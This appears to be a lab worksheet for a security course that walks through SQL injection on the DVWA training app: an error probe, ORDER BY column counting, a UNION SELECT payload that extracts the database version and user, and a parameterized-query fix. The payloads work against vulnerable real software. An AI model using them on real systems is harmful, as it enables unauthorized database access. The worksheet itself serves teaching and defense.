# Experiment 05: Step-by-Step Practical Procedure

---

## 🛑 MANUAL LAB EXECUTION CHECKPOINT

```text
============================================================
MANUAL LAB EXECUTION REQUIRED
============================================================
Experiment:          05 — SQL Injection Detection and Prevention
Target:              DVWA SQL Injection module (http://<LAB_TARGET>/dvwa/vulnerabilities/sqli/)
Required Environment: Kali Linux VM + DVWA target container/VM
Purpose:             Demonstrate authentication bypass & UNION-based SQLi proof of concept in DVWA
Expected Evidence:   1. HTTP request & injection payload log (outputs/sqli-payloads.txt)
                     2. Screenshot showing UNION payload output (screenshots/05-01-sqli-union.png)
============================================================
```

---

## 🛠️ Practical Procedure

### Step 1: Detect SQL Injection Entry Point
1. Log into DVWA in Kali browser (`admin:password`) and set security level to **Low**.
2. Navigate to **SQL Injection**.
3. Input test single quote `'` into the `User ID` field and click Submit.
4. *Observation:* Database outputs error: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...`

---

### Step 2: Determine Column Count using ORDER BY
Submit test ordering payloads:
- Payload 1: `1' ORDER BY 1-- -` -> Success (Column 1 exists).
- Payload 2: `1' ORDER BY 2-- -` -> Success (Column 2 exists).
- Payload 3: `1' ORDER BY 3-- -` -> Error: `Unknown column '3' in 'order clause'`.
*Result:* Target query returns **2 columns**.

---

### Step 3: Extract Database Version & User info using UNION SELECT
Submit UNION payload to extract database metadata:
```sql
1' UNION SELECT version(), user()-- -
```
*Observation:* Displayed fields output database version (e.g., `5.0.51a-3ubuntu5`) and current database user (e.g., `root@localhost`).

---

### Step 4: Verify Defensive Parameterization Fix
Switch DVWA security level to **Impossible** or audit secure PHP code:
```php
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```
*Observation:* Injecting `1' OR '1'='1` returns no results or invalid ID message; syntax hijacking fails completely.

---

## 📷 Screenshot Checklist

1. `05-01-sqli-error-detection.png`: Browser/terminal output showing MySQL syntax error upon injecting single quote `'`.
2. `05-02-sqli-union-metadata.png`: Browser/terminal showing `version()` and `user()` output extracted via UNION SELECT payload.
